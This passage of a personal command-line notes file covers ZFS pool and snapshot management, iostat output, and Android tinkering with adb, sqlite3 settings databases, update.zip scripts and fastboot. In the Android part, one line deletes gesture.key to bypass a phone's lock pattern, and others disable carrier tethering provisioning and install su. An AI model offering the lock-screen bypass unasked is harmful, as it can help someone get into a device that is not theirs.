+tank/test/productA         104M  66.2G   104M  /tank/test/productA
+tank/test/productA@today      0      -   104M  -
+tank/test/productAbeta        0  66.2G   104M  /tank/test/productAbeta
+# zfs promote tank/test/productAbeta
+# zfs list -r tank/test
+NAME                           USED  AVAIL  REFER  MOUNTPOINT
+tank/test                      104M  66.2G    24K  /tank/test
+tank/test/productA                0  66.2G   104M  /tank/test/productA
+tank/test/productAbeta         104M  66.2G   104M  /tank/test/productAbeta
+tank/test/productAbeta@today      0      -   104M  -
+
+# zfs rename tank/test/productA tank/test/productAlegacy
+# zfs rename tank/test/productAbeta tank/test/productA
+==
+
+*** zfs release [-r] keep pool/tank@snapshot
+    # Release hold on snapshot
+
+*** zfs rename [-f] filesystem|volume|snapshot filesystem|volume|snapshot
+    # rename pool or snapshot
+
+*** zfs rollback [-r] pool/tank@snapshot
+    # roll back to snapshot
+    # use -r to force deletion of earlier snapshots
+
+*** zfs set property=<on | off> <pool>
+    zfs set compress=on tankzz
+    zfs set dedup=on tankzz
+    zfs set sharenfs=on tankzz
+      # /etc/zfs/exports
+      # Add zfs_enable=YES in /etc/rc.conf
+
+*** zfs share [-a | filesystem]
+
+*** zfs snapshot [-r] tank@snapshot-name
+    # create snapshot <recursively> on tank
+
+*** zfs start at boot
+    [ `grep zfs_enable /etc/rc.conf` ] && echo ZFS enabled || (echo 'zfs_enable="YES"' >> /etc/rc.conf; echo ZFS added)
+
+*** zfs jail
+    # not just chroot(2)
+    - everythign lives under a directory mounted on the FS
+    - you *can* access the jail via chroot, but you don't get all the wins
+    - every jail has at least one IPv4/IPv6 address
+    - lightweight
+    - run Linux in a jail
+
+    # jail tools
+    jailadmin
+    jailctl
+    jailer
+    jailme
+    jailrc
+    jailuser
+    jailutil
+    jexec
+    jkill
+    jls
+    jps
+    ...
+
+** zfs : ARC (ZIL + L2ARC)
+   https://pthree.org/2012/12/03/how-a-zil-improves-disk-latencies/
+   https://blogs.oracle.com/brendan/entry/test
+
+*** Set maximum number
+When loading the "zfs" kernel module, make sure to set a maximum number for the ARC. Doing a lot of "zfs send" or snapshot operations will cache the data. If not set, RAM will slowly fill until the kernel invokes OOM killer, and the system becomes responsive. I have set in my /etc/modprobe.d/zfs.conf file "options zfs zfs_arc_max=2147483648", which is a 2 GB limit for the ARC.
+
+*** use disk ID /dev/disk/by-id/
+    # rather than the direct device, as it's guaranteed to be unique and persistent, even if the /dev/sd? assignment changes on boot. Because the cache drives are not persistent, they may not retain metadata about what they contain, so the pool will not add them if it can't find them.
+
+*** Adding ZIL (ZFS Intent Log) + L2ARC
+    # zpool add pool-name log mirror ata-OCZ-REVODRIVE_OCZ-33W9WE11E9X73Y41-part1 ata-OCZ-REVODRIVE_OCZ-X5RG0EIY7MN7676K-part1
+    # zpool add pool-name cache ata-OCZ-REVODRIVE_OCZ-33W9WE11E9X73Y41-part2 ata-OCZ-REVODRIVE_OCZ-X5RG0EIY7MN7676K-part2
+
+** zpool
+*** "Grow" a disk
+https://bugs.freenas.org/issues/342
+
+In order to "grow" a disk, the following operation have to be done from command line at this time. We are working on a better solution.
+
+    zpool export pool_to_be_grown
+    swapoff -a
+    (make the disk grow)
+    gpart backup ada0 > ada0.gpart
+    (repeat for EVERY disk in the pool; this is to backup the partition table in a text file so you could recover from mistake.)
+    gpart resize -i 2 ada0
+    (2 is the typical index number, repeat for every disk in the pool)
+    gpart show
+    (review if the partiton table is good)
+    swapon -a
+    zpool import pool_to_be_grown
+*** Expanding a ZFS pool
+http://www.itsacon.net/computers/unix/growing-a-zfs-pool/
+http://www.itsacon.net/computers/unix/expanding-a-zfs-pool/
+
+*** zpool create mypool mirror da0 da1 mirror da2 da3
+
+*** zpool export pool_to_be_grown
+
+*** zpool history pool
+    # shows history of changes made to pool
+
+*** zpool import <pool> <new_name>
+    # list pools that can be imported
+
+    # import all pools
+    zpool import -a
+
+** iostat
+*** iostat -xzn (Solaris)
+                     extended device statistics
+     r/s    w/s   kr/s   kw/s wait actv wsvc_t asvc_t  %w  %b device
+     0.0    0.1    0.1   48.7  0.0  0.0    0.0   41.7   0   0 c3t0d0
+     0.0    0.0    0.3    0.0  0.0  0.0    0.0    0.1   0   0 c3t1d0
+     1.7    1.8   70.6   23.9  0.0  0.0    1.0    0.5   0   0 c3t2d0
+     0.0    0.0    0.3    0.0  0.0  0.0    0.0    0.1   0   0 c3t3d0
+     0.1    1.8    0.3  326.5  0.2  0.0  109.4    1.9   1   0 c1t0d0
+     0.0    1.7    0.3  323.3  0.2  0.0  124.8    2.0   1   0 c1t0d1
+     0.1    1.8    0.4  327.9  0.2  0.0   90.2    2.7   1   1 c1t0d2
+     0.1    1.7    0.4  325.9  0.3  0.0  186.8    1.6   2   0 c1t0d3
+     0.1    0.0    0.9    0.0  0.0  0.0    0.0    0.9   0   0 c4t0d0
+
+*** iostat -xz
+                 extended device statistics
+device    r/s    w/s   kr/s   kw/s wait actv  svc_t  %w  %b
+sd0       0.0    0.1    0.1   59.7  0.0  0.0   45.0   0   0
+sd1       0.0    0.0    0.3    0.0  0.0  0.0    0.1   0   0
+sd2       1.6    1.8   70.0   23.7  0.0  0.0    1.5   0   0
+sd3       0.0    0.0    0.3    0.0  0.0  0.0    0.1   0   0
+sd4       0.1    2.0    0.3  376.8  0.3  0.0  123.7   1   0
+sd5       0.1    2.0    0.3  376.8  0.3  0.0  138.8   1   0
+sd6       0.1    2.0    0.4  376.9  0.2  0.0   97.9   1   1
+sd7       0.1    2.0    0.4  377.4  0.4  0.0  169.0   2   0
+sd16      0.1    0.0    0.9    0.0  0.0  0.0    0.9   0   0
+
+
+
+* Android
+
+** adb reboot
+** adb shell pm clear my.wonderful.app.package
+   clear app data
+
+   still doesn't clear everything it seems...
+   Lookie here: http://stackoverflow.com/questions/1989931/android-delete-app-associated-files-from-external-storage-on-uninstall
+** adb shell rm /data/system/gesture.key
+   remove the lock-pattern
+   the phone reboots and after reboot, just draw ANY pattern and it will unlock. :-)
+** ant
+   I forget what this is used for, but it's needed and it's an apache app
+
+** boot.img
+   dd if=boot.img of=/dev/block/mmcblk0p
+** settings - /data/data/com.android.providers.settings/databases/settings.db
+** Signing zip/apk
+*** 1 keytool
+    keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
+*** 2 jarsigner
+   jarsigner -verbose -sigalg MD5withRSA -digestalg SHA1 -keystore my-release-key.keystore my_application.apk alias_name
+
+   for /F %A in ('dir /b | findstr /i ".zip") do jarsigner -verbose -sigalg MD5withRSA -digestalg SHA1 -keystore my-release-key.keystore %A alias_name
+*** 3 zipalign
+    for /F %A in ('dir /b | findstr /i ".zip") do zipalign -f -v 4 %A zipaligned\%A
+** sqlite3
+*** DELETE FROM table WHERE exp;
+    delete from secure where _id = 64;
+*** LIKE '%pattern%';
+    select * from secure where name like '%bluetooth%';
+*** LIMIT 1
+    Show one row
+    select * from secure limit 1;
+*** INSERT INTO table (field1,field2) VALUES ("value1","value2");
+    insert into secure (_id,name,value) values ("63","bluetooth_name","TEST");
+*** UPDATE table SET column = "string" WHERE header = column;
+    update secure set value = "BMO" where _id = 35;
+*** Scripting
+    commands.txt:
+
+    CREATE TABLE log_entry (  );
+    .separator "\t"
+    .import logfile.log log_entry
+
+    sqlite3 database.db < commands.txt
+** storage locations
+   unique container in which your application is stored is encrypted
+   .android_secure portion of sdcard
+** system apps - /system/app
+** texts - /data/data/com.android.providers/telephony/databases/mmssms.db
+** Update.zip
+*** updater-script
+
+    ui_print("Copying files...");
+    run_program("/sbin/busybox", "mount", "/system");
+    show_progress(1, 15);
+    package_extract_dir("system", "/system");
+    package_extract_file("install-optional.sh", "/tmp/install-optional.sh");
+    run_program("/tmp/install-optional.sh", "");
+    set_perm_recursive(0, 0, 0755, 0644, "/system/app");
+
+
+    ui_print("***********************************************");
+    ui_print("          Google Apps for Android 4.2.1");
+    ui_print("");
+    ui_print("          including:");
+    ui_print("             /system/xbin/scp");
+    ui_print("             /system/xbin/sftp-server");
+    ui_print("             /system/xbin/su");
+    ui_print("***********************************************");
+
+    ui_print("Mounting system...");
+    run_program("/sbin/busybox", "mount", "/system");
+    show_progress(1, 15);
+    delete("/system/app/Provision.apk","/system/app/QuickSearchBox.apk","/system/app/SetupWizard.apk","/system/app/Velvet.apk","/system/app/Vending.apk","/system/app/BrowserProviderProxy.apk","/system/app/PartnerBookmarksProvider.apk");
+    ui_print("Copying files...");
+    package_extract_dir("system", "/system");
+    package_extract_file("install-optional.sh", "/tmp/install-optional.sh");
+    set_perm(0, 0, 0777, "/tmp/install-optional.sh");
+    run_program("/tmp/install-optional.sh", "");
+    show_progress(1, 15);
+    ui_print("Fixing Permissions...");
+    set_perm_recursive(0, 0, 0755, 0644, "/system/app");
+    ui_print("Unmounting system...");
+    run_program("/sbin/busybox", "umount", "/system");
+    ui_print("Installation complete!");
+
+*** sqlite3 queries
+    run_program("/system/xbin/sqlite3", "/data/data/com.android.providers.settings/databases/settings.db", "insert into system values(null, 'statusbar_clock_color','-354816');");
+
+** Tethering
+   # Does not work on Nexus 6 AT&T
+   /data/data/com.android.providers.settings/databases/settings.db
+   Add new key to global table
+   tether_dun_required:0
+
+   # May work on Nexus 6 AT&T
+   /system/build.prop
+   net.tethering.noprovisioning=true
+
+** Flashing
+   fastboot flash recovery recovery.img
+   fastboot flash boot boot.img
+   fastboot flash system system.img
+   fastboot flash userdata userdata.img
+   fastboot flash staging blob
+   fastboot flash dtb tegra114-roth.dtb
+
